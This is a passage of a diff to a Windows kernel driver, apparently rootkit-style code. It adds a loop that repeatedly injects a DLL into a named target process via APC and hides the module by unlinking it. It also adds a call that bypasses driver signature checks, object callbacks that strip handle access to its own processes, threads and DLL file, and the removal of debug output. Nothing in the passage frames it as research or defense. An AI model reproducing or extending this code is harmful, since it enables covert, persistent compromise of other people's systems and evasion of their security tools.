+		opReg.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall1;
+		obst1 = ObRegisterCallbacks(&obReg, &obHandle1);
+		//reg ob callback 2
+		memset(&obReg2, 0, sizeof(obReg2));
+		obReg2.Version = ObGetFilterVersion();
+		obReg2.OperationRegistrationCount = 1;
+		obReg2.RegistrationContext = NULL;
+		RtlInitUnicodeString(&obReg2.Altitude, L"321125");
+		obReg2.OperationRegistration = &opReg2;
+		memset(&opReg2, 0, sizeof(opReg2));
+		opReg2.ObjectType = PsThreadType;
+		opReg2.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
+		opReg2.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall2;
+		obst1 = ObRegisterCallbacks(&obReg2, &obHandle2);
+		return NT_SUCCESS(obst1) & NT_SUCCESS(obst2);
+	}
+	else
+	{
+		if (obHandle1 != NULL)
+			ObUnRegisterCallbacks(obHandle1);
+		if (obHandle2 != NULL)
+			ObUnRegisterCallbacks(obHandle2);
+		return TRUE;
+	}
+}
+/* process protection ends */
+
 PEPROCESS LookupProcess(HANDLE Pid) {
 	PEPROCESS eprocess = NULL;
 	if (NT_SUCCESS(PsLookupProcessByProcessId(Pid, &eprocess))) {
@@ -191,21 +901,23 @@ VOID MyThreadFunc(IN PVOID context)
 	NTSTATUS status = STATUS_SUCCESS;
 	INJECT_DLL data = { IT_Thread };
 
+	/*
+	*/
 	for (; ; ) {
 		wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT );
 		wcscpy_s(data.initArg, 512, L"");
 		data.type = IT_Apc;
 		data.pid = GetPidByPName(TARGET_PNAME_1);
 		data.pid = data.pid == INVALID_PID ? GetPidByPName(TARGET_PNAME_2) : data.pid;
-		DbgPrint("[+] data.pid %d\n", data.pid);
 		data.initRVA = 0;
 		data.wait = TRUE;
 		data.unlink = TRUE;
 		data.erasePE = FALSE;
 		status = BBInjectDll(&data);
-		DbgPrint("[+] retun of BBInjectDll %d", status);
 		MySleep(INJECT_SPLIT * 1000);
 	}
+/*
+	*/
 
 	/*
 	MySleep(3000);
@@ -214,61 +926,18 @@ VOID MyThreadFunc(IN PVOID context)
 	*/
 }
 
-OB_PREOP_CALLBACK_STATUS preCall(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation)
-{
-	UNICODE_STRING DosName;
-	PFILE_OBJECT fileo = OperationInformation->Object;
-	HANDLE CurrentProcessId = PsGetCurrentProcessId();
-	UNREFERENCED_PARAMETER(RegistrationContext);
-	if (OperationInformation->ObjectType != *IoFileObjectType)
-		return OB_PREOP_SUCCESS;
-	//过滤无效指针
-	if (fileo->FileName.Buffer == NULL ||
-		!MmIsAddressValid(fileo->FileName.Buffer) ||
-		fileo->DeviceObject == NULL ||
-		!MmIsAddressValid(fileo->DeviceObject))
-		return OB_PREOP_SUCCESS;
-	//过滤无效路径
-	if (!_wcsicmp(fileo->FileName.Buffer, L"\\Endpoint") ||
-		!_wcsicmp(fileo->FileName.Buffer, L"?") ||
-		!_wcsicmp(fileo->FileName.Buffer, L"\\.\\.") ||
-		!_wcsicmp(fileo->FileName.Buffer, L"\\"))
-		return OB_PREOP_SUCCESS;
-	//阻止访问readme.txt
-	if (wcsstr(_wcslwr(fileo->FileName.Buffer), TARGET_DLL_FOR_HOOK))
-	{
-		if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
-		{
-			OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = 0;
-		}
-		if (OperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
-		{
-			OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess = 0;
-		}
-	}
-	RtlVolumeDeviceToDosName(fileo->DeviceObject, &DosName);
-	DbgPrint("[FILE_MONITOR_X64][PID]%ld [File]%wZ%wZ\n", (ULONG64)CurrentProcessId, &DosName, &fileo->FileName);
-	return OB_PREOP_SUCCESS;
-}
-
-VOID EnableObType(POBJECT_TYPE ObjectType)
-{
-	PMY_OBJECT_TYPE myobtype = (PMY_OBJECT_TYPE)ObjectType;
-	myobtype->TypeInfo.SupportsObjectCallbacks = 1;
-}
-
-VOID _hijack_Unload()
-{
-	ObUnRegisterCallbacks(obHandle);
-}
-
 VOID _hijack(PDRIVER_OBJECT DriverObject) {
 	NTSTATUS status = STATUS_SUCCESS;
 	(void*)status;
 
+	// [+] ---------- process protection ----------
+	BypassCheckSign(DriverObject);
+	ObProtectProcess(1);
+	// [+] ---------- process protection ends ----------
+
 	// [+] ---------- file protection ----------
-	/*
-	*/
+	/* first way */
+#ifdef _FILE_PROTECTION_WAY_1_
 	OB_CALLBACK_REGISTRATION obReg;
 	OB_OPERATION_REGISTRATION opReg;
 	PLDR_DATA ldr;
@@ -287,16 +956,43 @@ VOID _hijack(PDRIVER_OBJECT DriverObject) {
 	opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
 	opReg.PreOperation = (POB_PRE_OPERATION_CALLBACK)&preCall;
 	status = ObRegisterCallbacks(&obReg, &obHandle);
+#endif
+	/* first way ends */
+	
+	/* second way */
+#ifdef _FILE_PROTECTION_WAY_2_
+	PSECURITY_DESCRIPTOR sd;
+	OBJECT_ATTRIBUTES oa;
+	UNICODE_STRING uniString;		//for communication port name
+	status = FltRegisterFilter(DriverObject,
+		&FilterRegistration,
+		&g_pFilterHandle);
+	ASSERT(NT_SUCCESS(status));
+	if (NT_SUCCESS(status))
+	{
+		status = FltStartFiltering(g_pFilterHandle);
+		if (!NT_SUCCESS(status))
+		{
+			FltUnregisterFilter(g_pFilterHandle);
+		}
+	}
+_Exit_DriverEntry:
 	if (!NT_SUCCESS(status))
 	{
-		DbgPrint("[FILE_MONITOR_X64] ERROR: events sources not installed\n");
+		if (NULL != g_pFilterHandle)
+		{
+			FltUnregisterFilter(g_pFilterHandle);
+			g_pFilterHandle = NULL;
+		}
 	}
-	else
-		DbgPrint("[FILE_MONITOR_X64] SUCCESS: callbacks registered\n");
+#endif
+	/* second way ends */
 	// [+] ---------- file protection ends ----------
 
-	// [+] ---------- Thread Inject ----------
 	/*
+	MyThreadFunc((void*)0);
+	*/
+	// [+] ---------- Thread Inject ----------
 	HANDLE hThread;
 	KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
 	status = PsCreateSystemThread(&hThread, 0, NULL, NULL, NULL, MyThreadFunc,
@@ -307,7 +1003,27 @@ VOID _hijack(PDRIVER_OBJECT DriverObject) {
 		return;
 	}
 	ZwClose(hThread);
-	*/
 	/*KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);*/
 	// [+] ---------- Thread Inject ends ----------
+}
+
+VOID _hijack_Unload()
+{
+	/* file protection : first way  */
+#ifdef _FILE_PROTECTION_WAY_1_
+	ObUnRegisterCallbacks(obHandle);
+#endif
+	/* file protection : first way ends */
+
+	/* file protection : second way  */
+#ifdef _FILE_PROTECTION_WAY_2_
+	PAGED_CODE();
+	FltUnregisterFilter(g_pFilterHandle);
+	DbgPrint("[MiniFilter][DriverUnload]\n");
+#endif
+	/* file protection : second way ends */
+
+	/* process protection */
+	ObProtectProcess(0);
+	/* process protection ends */
 }
